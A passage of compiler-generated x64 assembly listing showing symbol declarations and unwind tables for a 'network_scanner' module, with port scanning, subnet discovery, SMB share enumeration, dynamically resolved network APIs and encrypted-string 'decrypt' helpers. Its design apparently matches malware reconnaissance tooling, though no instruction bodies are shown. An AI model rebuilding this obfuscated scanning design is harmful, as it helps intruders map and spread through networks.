__int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >
PUBLIC	?decrypt@?$MetaBuffer@$0FJ@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAAPEBDXZ ; MetaBuffer<89,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt
PUBLIC	??0?$MetaBuffer@$0BH@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@QEAA@PEBE@Z ; MetaBuffer<23,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::MetaBuffer<23,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >
PUBLIC	?decrypt@?$MetaBuffer@$0BH@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@QEAAPEBDXZ ; MetaBuffer<23,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::decrypt
PUBLIC	??0?$MetaBuffer@$0BN@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAA@PEBE@Z ; MetaBuffer<29,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::MetaBuffer<29,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >
PUBLIC	?decrypt@?$MetaBuffer@$0BN@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAAPEBDXZ ; MetaBuffer<29,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::decrypt
PUBLIC	??0?$MetaBuffer@$0CP@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEAA@PEBE@Z ; MetaBuffer<47,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::MetaBuffer<47,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >
PUBLIC	?decrypt@?$MetaBuffer@$0CP@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEAAPEBDXZ ; MetaBuffer<47,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::decrypt
PUBLIC	?PortScanHandler@@YAKPEAX@Z			; PortScanHandler
PUBLIC	?TimerCallback@@YAXPEAXE@Z			; TimerCallback
PUBLIC	?CompleteAsyncConnect@@YAH_K@Z			; CompleteAsyncConnect
PUBLIC	?ScanHosts@@YAXXZ				; ScanHosts
PUBLIC	?CreateHostTable@@YAHXZ				; CreateHostTable
PUBLIC	?AddHost@@YAHK@Z				; AddHost
PUBLIC	?HostHandler@@YAKPEAX@Z				; HostHandler
PUBLIC	?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z ; network_scanner::EnumShares
PUBLIC	?GetSubnets@@YAHPEAUsubnet_list_@@@Z		; GetSubnets
PUBLIC	?GetConnectEX@@YAHXZ				; GetConnectEX
PUBLIC	?GetCurrentIpAddress@@YAKXZ			; GetCurrentIpAddress
PUBLIC	?pinet_ntoa@@YAPEADUin_addr@@@Z			; pinet_ntoa
PUBLIC	?pStrStrIA@@YAPEBDPEBD0@Z			; pStrStrIA
PUBLIC	?pWSACleanup@@YAHXZ				; pWSACleanup
PUBLIC	?pWSAStartup@@YAHGPEAUWSAData@@@Z		; pWSAStartup
PUBLIC	?pshutdown@@YAH_KH@Z				; pshutdown
PUBLIC	?pgetsockopt@@YAH_KHHPEADPEAH@Z			; pgetsockopt
PUBLIC	?psetsockopt@@YAH_KHHPEBDH@Z			; psetsockopt
PUBLIC	?pbind@@YAH_KPEBUsockaddr@@H@Z			; pbind
PUBLIC	?pWSASocketW@@YA_KHHHPEAU_WSAPROTOCOL_INFOW@@IK@Z ; pWSASocketW
PUBLIC	?pWSAAddressToStringW@@YAHPEAUsockaddr@@KPEAU_WSAPROTOCOL_INFOW@@PEA_WPEAK@Z ; pWSAAddressToStringW
PUBLIC	?pclosesocket@@YAH_K@Z				; pclosesocket
PUBLIC	?pWSAIoctl@@YAH_KKPEAXK1KPEAKPEAU_OVERLAPPED@@P6AXKK3K@Z@Z ; pWSAIoctl
PUBLIC	?pgethostname@@YAHPEADH@Z			; pgethostname
PUBLIC	?pgethostbyname@@YAPEAUhostent@@PEBD@Z		; pgethostbyname
PUBLIC	?pGetIpNetTable@@YAKPEAU_MIB_IPNETTABLE@@PEAKH@Z ; pGetIpNetTable
PUBLIC	?pNetShareEnum@@YAKPEA_WKPEAPEAEKPEAK22@Z	; pNetShareEnum
PUBLIC	?pNetApiBufferFree@@YAKPEAX@Z			; pNetApiBufferFree
PUBLIC	?pCreateTimerQueue@@YAPEAXXZ			; pCreateTimerQueue
PUBLIC	?pCreateIoCompletionPort@@YAPEAXPEAX0_KK@Z	; pCreateIoCompletionPort
PUBLIC	?pDeleteCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z ; pDeleteCriticalSection
PUBLIC	?pGlobalFree@@YAPEAXPEAX@Z			; pGlobalFree
PUBLIC	?pGlobalAlloc@@YAPEAXI_K@Z			; pGlobalAlloc
PUBLIC	?pSleep@@YAXK@Z					; pSleep
PUBLIC	?pPostQueuedCompletionStatus@@YAHPEAXK_KPEAU_OVERLAPPED@@@Z ; pPostQueuedCompletionStatus
PUBLIC	?pExitThread@@YAXK@Z				; pExitThread
PUBLIC	?pGetQueuedCompletionStatus@@YAHPEAXPEAKPEA_KPEAPEAU_OVERLAPPED@@K@Z ; pGetQueuedCompletionStatus
PUBLIC	?pDeleteTimerQueue@@YAHPEAX@Z			; pDeleteTimerQueue
PUBLIC	?pCreateTimerQueueTimer@@YAHPEAPEAXPEAXP6AX1E@Z1KKK@Z ; pCreateTimerQueueTimer
PUBLIC	?pCreateThread@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@_KP6AKPEAX@Z2KPEAK@Z ; pCreateThread
PUBLIC	?pCancelIo@@YAHPEAX@Z				; pCancelIo
PUBLIC	?StartScan@network_scanner@@YAXXZ		; network_scanner::StartScan
;	COMDAT pdata
pdata	SEGMENT
$pdata$?PortScanHandler@@YAKPEAX@Z DD imagerel $LN156
	DD	imagerel $LN156+1103
	DD	imagerel $unwind$?PortScanHandler@@YAKPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?TimerCallback@@YAXPEAXE@Z DD imagerel $LN6
	DD	imagerel $LN6+53
	DD	imagerel $unwind$?TimerCallback@@YAXPEAXE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?CompleteAsyncConnect@@YAH_K@Z DD imagerel $LN16
	DD	imagerel $LN16+176
	DD	imagerel $unwind$?CompleteAsyncConnect@@YAH_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?ScanHosts@@YAXXZ DD imagerel $LN19
	DD	imagerel $LN19+37
	DD	imagerel $unwind$?ScanHosts@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$2$?ScanHosts@@YAXXZ DD imagerel $LN19+37
	DD	imagerel $LN19+219
	DD	imagerel $chain$2$?ScanHosts@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$3$?ScanHosts@@YAXXZ DD imagerel $LN19+219
	DD	imagerel $LN19+238
	DD	imagerel $chain$3$?ScanHosts@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?CreateHostTable@@YAHXZ DD imagerel $LN53
	DD	imagerel $LN53+58
	DD	imagerel $unwind$?CreateHostTable@@YAHXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$5$?CreateHostTable@@YAHXZ DD imagerel $LN53+58
	DD	imagerel $LN53+490
	DD	imagerel $chain$5$?CreateHostTable@@YAHXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$6$?CreateHostTable@@YAHXZ DD imagerel $LN53+490
	DD	imagerel $LN53+555
	DD	imagerel $chain$6$?CreateHostTable@@YAHXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?AddHost@@YAHK@Z DD imagerel $LN33
	DD	imagerel $LN33+339
	DD	imagerel $unwind$?AddHost@@YAHK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?HostHandler@@YAKPEAX@Z DD imagerel $LN355
	DD	imagerel $LN355+814
	DD	imagerel $unwind$?HostHandler@@YAKPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z DD imagerel $LN243
	DD	imagerel $LN243+146
	DD	imagerel $unwind$?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$0$?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z DD imagerel $LN243+146
	DD	imagerel $LN243+168
	DD	imagerel $chain$0$?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$2$?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z DD imagerel $LN243+168
	DD	imagerel $LN243+1142
	DD	imagerel $chain$2$?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$3$?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z DD imagerel $LN243+1142
	DD	imagerel $LN243+1175
	DD	imagerel $chain$3$?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$4$?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z DD imagerel $LN243+1175
	DD	imagerel $LN243+1204
	DD	imagerel $chain$4$?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?GetSubnets@@YAHPEAUsubnet_list_@@@Z DD imagerel $LN561
	DD	imagerel $LN561+593
	DD	imagerel $unwind$?GetSubnets@@YAHPEAUsubnet_list_@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$0$?GetSubnets@@YAHPEAUsubnet_list_@@@Z DD imagerel $LN561+593
	DD	imagerel $LN561+1141
	DD	imagerel $chain$0$?GetSubnets@@YAHPEAUsubnet_list_@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$1$?GetSubnets@@YAHPEAUsubnet_list_@@@Z DD imagerel $LN561+1141
	DD	imagerel $LN561+1160
	DD	imagerel $chain$1$?GetSubnets@@YAHPEAUsubnet_list_@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$4$?GetSubnets@@YAHPEAUsubnet_list_@@@Z DD imagerel $LN561+1160
	DD	imagerel $LN561+2082
	DD	imagerel $chain$4$?GetSubnets@@YAHPEAUsubnet_list_@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$5$?GetSubnets@@YAHPEAUsubnet_list_@@@Z DD imagerel $LN561+2082
	DD	imagerel $LN561+2103
	DD	imagerel $chain$5$?GetSubnets@@YAHPEAUsubnet_list_@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$6$?GetSubnets@@YAHPEAUsubnet_list_@@@Z DD imagerel $LN561+2103
	DD	imagerel $LN561+2111
	DD	imagerel $chain$6$?GetSubnets@@YAHPEAUsubnet_list_@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$7$?GetSubnets@@YAHPEAUsubnet_list_@@@Z DD imagerel $LN561+2111
	DD	imagerel $LN561+2134
	DD	imagerel $chain$7$?GetSubnets@@YAHPEAUsubnet_list_@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?GetConnectEX@@YAHXZ DD imagerel $LN18
	DD	imagerel $LN18+257
	DD	imagerel $unwind$?GetConnectEX@@YAHXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?GetCurrentIpAddress@@YAKXZ DD imagerel $LN13
	DD	imagerel $LN13+122
	DD	imagerel $unwind$?GetCurrentIpAddress@@YAKXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pinet_ntoa@@YAPEADUin_addr@@@Z DD imagerel $LN4
	DD	imagerel $LN4+38
	DD	imagerel $unwind$?pinet_ntoa@@YAPEADUin_addr@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pStrStrIA@@YAPEBDPEBD0@Z DD imagerel $LN4
	DD	imagerel $LN4+55
	DD	imagerel $unwind$?pStrStrIA@@YAPEBDPEBD0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pWSACleanup@@YAHXZ DD imagerel $LN4
	DD	imagerel $LN4+31
	DD	imagerel $unwind$?pWSACleanup@@YAHXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pWSAStartup@@YAHGPEAUWSAData@@@Z DD imagerel $LN4
	DD	imagerel $LN4+45
	DD	imagerel $unwind$?pWSAStartup@@YAHGPEAUWSAData@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pshutdown@@YAH_KH@Z DD imagerel $LN4
	DD	imagerel $LN4+45
	DD	imagerel $unwind$?pshutdown@@YAH_KH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pgetsockopt@@YAH_KHHPEADPEAH@Z DD imagerel $LN4
	DD	imagerel $LN4+66
	DD	imagerel $unwind$?pgetsockopt@@YAH_KHHPEADPEAH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?psetsockopt@@YAH_KHHPEBDH@Z DD imagerel $LN4
	DD	imagerel $LN4+62
	DD	imagerel $unwind$?psetsockopt@@YAH_KHHPEBDH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pbind@@YAH_KPEBUsockaddr@@H@Z DD imagerel $LN4
	DD	imagerel $LN4+61
	DD	imagerel $unwind$?pbind@@YAH_KPEBUsockaddr@@H@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pWSASocketW@@YA_KHHHPEAU_WSAPROTOCOL_INFOW@@IK@Z DD imagerel $LN4
	DD	imagerel $LN4+53
	DD	imagerel $unwind$?pWSASocketW@@YA_KHHHPEAU_WSAPROTOCOL_INFOW@@IK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pWSAAddressToStringW@@YAHPEAUsockaddr@@KPEAU_WSAPROTOCOL_INFOW@@PEA_WPEAK@Z DD imagerel $LN4
	DD	imagerel $LN4+62
	DD	imagerel $unwind$?pWSAAddressToStringW@@YAHPEAUsockaddr@@KPEAU_WSAPROTOCOL_INFOW@@PEA_WPEAK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pclosesocket@@YAH_K@Z DD imagerel $LN4
	DD	imagerel $LN4+40
	DD	imagerel $unwind$?pclosesocket@@YAH_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pWSAIoctl@@YAH_KKPEAXK1KPEAKPEAU_OVERLAPPED@@P6AXKK3K@Z@Z DD imagerel $LN4
	DD	imagerel $LN4+110
	DD	imagerel $unwind$?pWSAIoctl@@YAH_KKPEAXK1KPEAKPEAU_OVERLAPPED@@P6AXKK3K@Z@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pgethostname@@YAHPEADH@Z DD imagerel $LN4
	DD	imagerel $LN4+45
	DD	imagerel $unwind$?pgethostname@@YAHPEADH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pgethostbyname@@YAPEAUhostent@@PEBD@Z DD imagerel $LN4
	DD	imagerel $LN4+40
	DD	imagerel $unwind$?pgethostbyname@@YAPEAUhostent@@PEBD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pGetIpNetTable@@YAKPEAU_MIB_IPNETTABLE@@PEAKH@Z DD imagerel $LN4
	DD	imagerel $LN4+58
	DD	imagerel $unwind$?pGetIpNetTable@@YAKPEAU_MIB_IPNETTABLE@@PEAKH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pNetShareEnum@@YAKPEA_WKPEAPEAEKPEAK22@Z DD imagerel $LN4
	DD	imagerel $LN4+66
	DD	imagerel $unwind$?pNetShareEnum@@YAKPEA_WKPEAPEAEKPEAK22@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pNetApiBufferFree@@YAKPEAX@Z DD imagerel $LN4
	DD	imagerel $LN4+40
	DD	imagerel $unwind$?pNetApiBufferFree@@YAKPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pCreateTimerQueue@@YAPEAXXZ DD imagerel $LN4
	DD	imagerel $LN4+31
	DD	imagerel $unwind$?pCreateTimerQueue@@YAPEAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pCreateIoCompletionPort@@YAPEAXPEAX0_KK@Z DD imagerel $LN4
	DD	imagerel $LN4+74
	DD	imagerel $unwind$?pCreateIoCompletionPort@@YAPEAXPEAX0_KK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pDeleteCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z DD imagerel $LN4
	DD	imagerel $LN4+38
	DD	imagerel $unwind$?pDeleteCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pGlobalFree@@YAPEAXPEAX@Z DD imagerel $LN4
	DD	imagerel $LN4+40
	DD	imagerel $unwind$?pGlobalFree@@YAPEAXPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pGlobalAlloc@@YAPEAXI_K@Z DD imagerel $LN4
	DD	imagerel $LN4+38
	DD	imagerel $unwind$?pGlobalAlloc@@YAPEAXI_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pSleep@@YAXK@Z DD imagerel $LN4
	DD	imagerel $LN4+38
	DD	imagerel $unwind$?pSleep@@YAXK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pPostQueuedCompletionStatus@@YAHPEAXK_KPEAU_OVERLAPPED@@@Z DD imagerel $LN4
	DD	imagerel $LN4+64
	DD	imagerel $unwind$?pPostQueuedCompletionStatus@@YAHPEAXK_KPEAU_OVERLAPPED@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pExitThread@@YAXK@Z DD imagerel $LN4
	DD	imagerel $LN4+38
	DD	imagerel $unwind$?pExitThread@@YAXK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pGetQueuedCompletionStatus@@YAHPEAXPEAKPEA_KPEAPEAU_OVERLAPPED@@K@Z DD imagerel $LN4
	DD	imagerel $LN4+99
	DD	imagerel $unwind$?pGetQueuedCompletionStatus@@YAHPEAXPEAKPEA_KPEAPEAU_OVERLAPPED@@K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pDeleteTimerQueue@@YAHPEAX@Z DD imagerel $LN4
	DD	imagerel $LN4+40
	DD	imagerel $unwind$?pDeleteTimerQueue@@YAHPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pCreateTimerQueueTimer@@YAHPEAPEAXPEAXP6AX1E@Z1KKK@Z DD imagerel $LN4
	DD	imagerel $LN4+86
	DD	imagerel $unwind$?pCreateTimerQueueTimer@@YAHPEAPEAXPEAXP6AX1E@Z1KKK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pCreateThread@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@_KP6AKPEAX@Z2KPEAK@Z DD imagerel $LN4
	DD	imagerel $LN4+68
	DD	imagerel $unwind$?pCreateThread@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@_KP6AKPEAX@Z2KPEAK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pCancelIo@@YAHPEAX@Z DD imagerel $LN4
	DD	imagerel $LN4+40
	DD	imagerel $unwind$?pCancelIo@@YAHPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?StartScan@network_scanner@@YAXXZ DD imagerel $LN1120
	DD	imagerel $LN1120+2633
	DD	imagerel $unwind$?StartScan@network_scanner@@YAXXZ
;	COMDAT xdata
xdata	SEGMENT
$unwind$?StartScan@network_scanner@@YAXXZ DD 0b3519H
	DD	08de424H
	DD	08c7424H
	DD	08b6424H
	DD	08a3424H
	DD	0880124H
	DD	05015H
	DD	imagerel __GSHandlerCheck
	DD	0430H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pCancelIo@@YAHPEAX@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pCreateThread@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@_KP6AKPEAX@Z2KPEAK@Z DD 040a01H
	DD	08340aH
	DD	07006520aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pCreateTimerQueueTimer@@YAHPEAPEAXPEAXP6AX1E@Z1KKK@Z DD 040a01H
	DD	0a340aH
	DD	07006720aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pDeleteTimerQueue@@YAHPEAX@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pGetQueuedCompletionStatus@@YAHPEAXPEAKPEA_KPEAPEAU_OVERLAPPED@@K@Z DD 081401H
	DD	0a6414H
	DD	095414H
	DD	083414H
	DD	070105214H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pExitThread@@YAXK@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pPostQueuedCompletionStatus@@YAHPEAXK_KPEAU_OVERLAPPED@@@Z DD 040a01H
	DD	06340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pSleep@@YAXK@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pGlobalAlloc@@YAPEAXI_K@Z DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pGlobalFree@@YAPEAXPEAX@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pDeleteCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pCreateIoCompletionPort@@YAPEAXPEAX0_KK@Z DD 060f01H
	DD	07640fH
	DD	06340fH
	DD	0700b320fH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pCreateTimerQueue@@YAPEAXXZ DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pNetApiBufferFree@@YAKPEAX@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pNetShareEnum@@YAKPEA_WKPEAPEAEKPEAK22@Z DD 040a01H
	DD	0a340aH
	DD	07006720aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pGetIpNetTable@@YAKPEAU_MIB_IPNETTABLE@@PEAKH@Z DD 040a01H
	DD	06340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pgethostbyname@@YAPEAUhostent@@PEBD@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pgethostname@@YAHPEADH@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pWSAIoctl@@YAH_KKPEAXK1KPEAKPEAU_OVERLAPPED@@P6AXKK3K@Z@Z DD 040a01H
	DD	0c340aH
	DD	07006920aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pclosesocket@@YAH_K@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pWSAAddressToStringW@@YAHPEAUsockaddr@@KPEAU_WSAPROTOCOL_INFOW@@PEA_WPEAK@Z DD 040a01H
	DD	08340aH
